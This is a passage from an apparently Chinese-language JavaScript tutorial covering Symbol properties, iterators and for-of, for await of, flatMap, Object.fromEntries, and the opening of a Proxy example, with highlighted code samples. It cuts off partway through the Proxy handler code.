</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p><strong>遍历</strong></p> <p>遍历属性名：无法通过不会被<strong>for...in</strong>、<strong>for...of</strong>和<strong>Object.keys()</strong>、**Object.getOwnPropertyNames()**取到该属性；</p> <ol><li>只有<code>Object.getOwnPropertySymbols(obj)</code>和<code>Reflect.ownKeys(obj)</code>可以拿到Symbol属性</li> <li>只有<code>Reflect.ownKeys(obj)</code><strong>可以拿到不可枚举属性;</strong></li></ol> <p>详见上面遍历介绍中的【一级对象遍历比较】</p> <p><strong>Symbol作为属性的属性不会被枚举出来，这也是<code>JSON.stringfy(obj)</code>时，Symbol属性会被排除在外的原因</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> gender <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">'gender'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>
  name<span class="token operator">:</span> <span class="token string">'samy'</span><span class="token punctuation">,</span>
  age<span class="token operator">:</span> <span class="token number">23</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span>gender<span class="token punctuation">]</span><span class="token operator">:</span> <span class="token string">'男'</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [ 'name', 'age' ]</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token comment">// name age</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// {&quot;name&quot;:&quot;samy&quot;,&quot;age&quot;:23}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><p>其实想获取Symbol属性也不是没办法。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 方法一</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertySymbols</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [ Symbol(gender) ]</span>
<span class="token comment">// 方法二</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Reflect<span class="token punctuation">.</span><span class="token function">ownKeys</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// [ 'name', 'age', Symbol(gender) ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="symbol-for【要点】"><a href="#symbol-for【要点】" class="header-anchor">#</a> Symbol.for【要点】</h5> <blockquote><p>在全局中搜索有没有以该参数作为名称的Symbol值，<strong>如果有，就返回这个Symbol值，否则就新建并返回一个以该字符串为名称的Symbol值</strong></p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> s1 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> s2 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Symbol()</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Symbol()</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1 <span class="token operator">===</span> s2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// false</span>

<span class="token keyword">var</span> s1 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> s2 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s1 <span class="token operator">===</span> s2 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// false</span>

<span class="token keyword">var</span> s3 <span class="token operator">=</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">'foo2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> s4 <span class="token operator">=</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">'foo2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>s3 <span class="token operator">===</span> s4 <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h5 id="symbol-keyfor"><a href="#symbol-keyfor" class="header-anchor">#</a> Symbol.keyFor</h5> <blockquote><p>返回一个<strong>已登记的Symbol类型值的key</strong></p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> s1 <span class="token operator">=</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Symbol<span class="token punctuation">.</span><span class="token function">keyFor</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token comment">// &quot;foo&quot; 【要点】</span>

<span class="token keyword">var</span> s2 <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;foo&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Symbol<span class="token punctuation">.</span><span class="token function">keyFor</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span> <span class="token comment">// undefined </span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><strong>私有属性方法</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> name <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;name&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> print <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token string">&quot;print&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">age</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;Bruce&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token punctuation">[</span>print<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> is </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string"> years old</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h5 id="应用场景-2"><a href="#应用场景-2" class="header-anchor">#</a> 应用场景</h5> <ul><li>唯一化对象属性名：属性名属于Symbol类型，就都是独一无二的，可保证不会与其他属性名产生冲突;</li> <li><strong>使用Symbol来替代常量</strong>;</li> <li><strong>使用Symbol定义类的私有属性</strong>;</li> <li>消除魔术字符串：在代码中多次出现且与代码形成强耦合的某一个具体的字符串或数值</li> <li>启用模块的Singleton模式：调用一个类在任何时候返回同一个实例(<code>window</code>和<code>global</code>)，使用<code>Symbol.for()</code>来模拟全局的<code>Singleton模式</code>;</li></ul> <p><strong>使用Symbol来替代常量</strong></p> <p>有以下场景</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// 赋值</span>
<span class="token keyword">const</span> one <span class="token operator">=</span> <span class="token string">'oneXin'</span>
<span class="token keyword">const</span> two <span class="token operator">=</span> <span class="token string">'twoXin'</span>
<span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">switch</span> <span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">case</span> one<span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'one'</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> two<span class="token operator">:</span>
        <span class="token keyword">return</span> <span class="token string">'two'</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>如果变量少的话还好，<strong>但是变量多的时候，赋值命名很烦，可以利用Symbol的唯一性</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> one <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> two <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><strong>使用Symbol定义类的私有属性</strong></p> <p>以下例子，PASSWORD属性无法在实例里获取到</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">class</span> <span class="token class-name">Login</span> <span class="token punctuation">{</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> password</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token constant">PASSWORD</span> <span class="token operator">=</span> <span class="token function">Symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username
    <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token constant">PASSWORD</span><span class="token punctuation">]</span> <span class="token operator">=</span> password
  <span class="token punctuation">}</span>
  <span class="token function">checkPassword</span><span class="token punctuation">(</span><span class="token parameter">pwd</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">[</span><span class="token constant">PASSWORD</span><span class="token punctuation">]</span> <span class="token operator">===</span> pwd <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> login <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Login</span><span class="token punctuation">(</span><span class="token string">'123456'</span><span class="token punctuation">,</span> <span class="token string">'hahah'</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>login<span class="token punctuation">.</span><span class="token constant">PASSWORD</span><span class="token punctuation">)</span> <span class="token comment">// 报错</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>login<span class="token punctuation">[</span><span class="token constant">PASSWORD</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// 报错</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>login<span class="token punctuation">[</span><span class="token constant">PASSWORD</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// 报错</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><h4 id="_9-iterator"><a href="#_9-iterator" class="header-anchor">#</a> 9:Iterator</h4> <p>定义：<strong>为各种不同的数据结构提供统一的访问机制</strong></p> <p>原理：<strong>创建一个指针指向首个成员，按照次序使用<code>next()</code>指向下一个成员，直接到结束位置</strong>(数据结构只要部署<code>Iterator接口</code>就可完成遍历操作)</p> <p>作用</p> <ul><li>为各种数据结构提供一个统一的简便的访问接口</li> <li>使得数据结构成员能够按某种次序排列</li> <li>ES6创造了新的遍历命令<code>for-of</code>，<code>Iterator接口</code>主要供<code>for-of</code>消费</li></ul> <p>形式：<code>for-of</code>(自动去寻找Iterator接口)</p> <p><strong>数据结构</strong></p> <ul><li>集合：<code>Array</code>、<code>Object</code>、<code>Set</code>、<code>Map</code></li> <li>原生具备接口的数据结构：<code>String</code>、<code>Array</code>、<code>Set</code>、<code>Map</code>、<code>TypedArray</code>、<code>Arguments</code>、<code>NodeList</code></li></ul> <p>部署：<strong>默认部署在<code>Symbol.iterator</code>(具备此属性被认为<code>可遍历的iterable</code>)</strong></p> <p>遍历器对象</p> <ul><li><strong>next()</strong>：下一步操作，返回<code>{ done, value }</code>(必须部署)</li> <li><strong>return()</strong>：<code>for-of</code>提前退出调用，返回<code>{ done: true }</code></li> <li><strong>throw()</strong>：不使用，配合<code>Generator函数</code>使用</li></ul> <h5 id="forof循环"><a href="#forof循环" class="header-anchor">#</a> ForOf循环</h5> <p>定义：调用<code>Iterator接口</code>产生遍历器对象(<code>for-of</code>内部调用数据结构的<code>Symbol.iterator()</code>)</p> <p>遍历字符串：<code>for-in</code>获取<code>索引</code>，<code>for-of</code>获取<code>值</code>(可识别32位UTF-16字符)</p> <p>遍历数组：<code>for-in</code>获取<code>索引</code>，<code>for-of</code>获取<code>值</code></p> <p>遍历对象：<code>for-in</code>获取<code>键</code>，<code>for-of</code>需自行部署</p> <p>遍历Set：<code>for-of</code>获取<code>值</code> =&gt; <code>for (const v of set)</code></p> <p>遍历Map：<code>for-of</code>获取<code>键值对</code> =&gt;  <code>for (const [k, v] of map)</code></p> <p>遍历类数组：<code>包含length的对象</code>、<code>Arguments对象</code>、<code>NodeList对象</code>(无<code>Iterator接口的类数组</code>可用<code>Array.from()</code>转换)</p> <p><strong>计算生成数据结构</strong>： <code>Array</code>、<code>Set</code>、 <code>Map</code></p> <ul><li><strong>keys()</strong>：返回遍历器对象，遍历所有的键</li> <li><strong>values()</strong>：返回遍历器对象，遍历所有的值</li> <li><strong>entries()</strong>：返回遍历器对象，遍历所有的键值对</li></ul> <p><strong>与 <code>for-in</code>区别</strong></p> <ul><li>有着同<code>for-in</code>一样的简洁语法，<strong>但没有<code>for-in</code>那些缺点</strong></li> <li>不同于<code>forEach()</code>，<strong>它可与<code>break</code>、<code>continue</code>和<code>return</code>配合使用</strong></li> <li>提供遍历所有数据结构的统一操作接口</li></ul> <h5 id="应用场景-3"><a href="#应用场景-3" class="header-anchor">#</a> 应用场景</h5> <ul><li>改写具有<code>Iterator接口</code>的数据结构的<code>Symbol.iterator</code></li> <li>解构赋值：对Set进行结构</li> <li>扩展运算符：将部署<code>Iterator接口</code>的数据结构转为数组</li> <li>yield*：<code>yield*</code>后跟一个可遍历的数据结构，会调用其遍历器接口</li> <li>接受数组作为参数的函数：<code>for-of</code>、<code>Array.from()</code>、<code>new Set()</code>、<code>new WeakSet()</code>、<code>new Map()</code>、<code>new WeakMap()</code>、<code>Promise.all()</code>、<code>Promise.race()</code></li></ul> <h5 id="for-await-of"><a href="#for-await-of" class="header-anchor">#</a> for await of</h5> <blockquote><h4 id="for-of和for-await-of的区别"><a href="#for-of和for-await-of的区别" class="header-anchor">#</a> for-of和for await of的区别</h4></blockquote> <ul><li><code>for-of</code>是用来遍历同步操作的;</li> <li><code>for-of</code>里面用<code>await</code>，如果有其他操作，也会有输出顺序错误;</li> <li><code>for await of</code> 是可以对异步集合进行操作;</li></ul> <p>遍历 await使用；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">fn</span> <span class="token punctuation">(</span><span class="token parameter">time</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>time<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">毫秒后我成功啦！！！</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span> time<span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">asyncFn</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
  <span class="token keyword">for</span> <span class="token keyword">await</span> <span class="token punctuation">(</span><span class="token keyword">let</span> x <span class="token keyword">of</span> arr<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token function">asyncFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">//3000毫秒后我成功啦！！！</span>
<span class="token comment">//1000毫秒后我成功啦！！！</span>
<span class="token comment">//1000毫秒后我成功啦！！！</span>
<span class="token comment">//2000毫秒后我成功啦！！！</span>
<span class="token comment">//500毫秒后我成功啦！！！</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h5 id="array-flatmap"><a href="#array-flatmap" class="header-anchor">#</a> Array.flatMap</h5> <p>现在给你一个需求</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&quot;科比 詹姆斯 安东尼&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;利拉德 罗斯 麦科勒姆&quot;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>将上面数组转为</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span> <span class="token string">'科比'</span><span class="token punctuation">,</span> <span class="token string">'詹姆斯'</span><span class="token punctuation">,</span> <span class="token string">'安东尼'</span><span class="token punctuation">,</span> <span class="token string">'利拉德'</span><span class="token punctuation">,</span> <span class="token string">'罗斯'</span><span class="token punctuation">,</span> <span class="token string">'麦科勒姆'</span> <span class="token punctuation">]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>第一时间想到<code>map + flat</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=&gt;</span> x<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">flat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [ '科比', '詹姆斯', '安东尼', '利拉德', '罗斯', '麦科勒姆' ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><code>flatMap</code>就是<code>flat + map</code>，一个方法顶两个</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=&gt;</span> x<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">&quot; &quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// [ '科比', '詹姆斯', '安东尼', '利拉德', '罗斯', '麦科勒姆' ]</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h5 id="object-fromentries"><a href="#object-fromentries" class="header-anchor">#</a> Object.fromEntries</h5> <p>前面ES8的<code>Object.entries</code>是把<code>对象转成键值对数组</code>，而<code>Object.fromEntries</code>则相反，是把<code>键值对数组转为对象</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span>
  <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'samy'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
  <span class="token punctuation">[</span><span class="token string">'gender'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">]</span>
<span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// { name: 'samy', age: 22, gender: '男' }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>他还有一个用处，就是把<code>Map转为对象</code></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'samy'</span><span class="token punctuation">)</span>
map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span>
map<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'gender'</span><span class="token punctuation">,</span> <span class="token string">'男'</span><span class="token punctuation">)</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span> <span class="token comment">// Map(3) { 'name' =&gt; 'samy', 'age' =&gt; 22, 'gender' =&gt; '男' }</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token comment">// { name: 'samy', age: 22, gender: '男' }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br></div></div><h3 id="proxy-reflect-set-map"><a href="#proxy-reflect-set-map" class="header-anchor">#</a> Proxy/Reflect/Set/Map</h3> <h4 id="_1-proxy及案例"><a href="#_1-proxy及案例" class="header-anchor">#</a> 1:Proxy及案例</h4> <p>声明：<code>const proxy = new Proxy(target, handler)</code></p> <ul><li><strong>target</strong>：拦截的目标对象</li> <li><strong>handler</strong>：定制拦截行为</li></ul> <p>案例：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">''</span>  <span class="token punctuation">}</span>
<span class="token keyword">let</span> handler <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;get&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;set&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
